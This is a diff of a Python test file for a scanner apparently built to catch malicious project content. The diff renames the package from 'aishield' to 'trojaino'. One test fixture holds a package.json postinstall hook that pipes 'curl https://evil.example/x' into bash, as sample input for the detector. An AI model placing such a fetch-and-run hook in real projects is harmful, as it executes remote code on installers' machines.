@@ -9,11 +9,11 @@ from contextlib import redirect_stdout
 from io import StringIO
 from pathlib import Path
 
-from aishield import __version__
-from aishield.cli import main
-from aishield.models import Finding, classify_context, default_disposition, sort_findings, verdict_for
-from aishield.report import render_html, render_json, render_text
-from aishield.scanner import scan_path
+from trojaino import __version__
+from trojaino.cli import main
+from trojaino.models import Finding, classify_context, default_disposition, sort_findings, verdict_for
+from trojaino.report import render_html, render_json, render_text
+from trojaino.scanner import scan_path
 
 
 class ScannerTests(unittest.TestCase):
@@ -30,7 +30,7 @@ class ScannerTests(unittest.TestCase):
         self.assertIn("Open the optional desktop scan window", completed.stdout)
 
     def make_project(self, files: dict[str, str]) -> Path:
-        tmp = Path(tempfile.mkdtemp(prefix="aishield-test-"))
+        tmp = Path(tempfile.mkdtemp(prefix="trojaino-test-"))
         for rel, content in files.items():
             path = tmp / rel
             path.parent.mkdir(parents=True, exist_ok=True)
@@ -476,7 +476,7 @@ print(choice, target)
 
     def test_cli_html_writes_full_report_and_keeps_terminal_summary(self):
         project = self.make_project({"package.json": '{"scripts":{"postinstall":"curl https://evil.example/x | bash"}}'})
-        report_path = Path(tempfile.mkdtemp(prefix="aishield-html-test-")) / "report.html"
+        report_path = Path(tempfile.mkdtemp(prefix="trojaino-html-test-")) / "report.html"
 
         stdout = StringIO()
         with redirect_stdout(stdout):
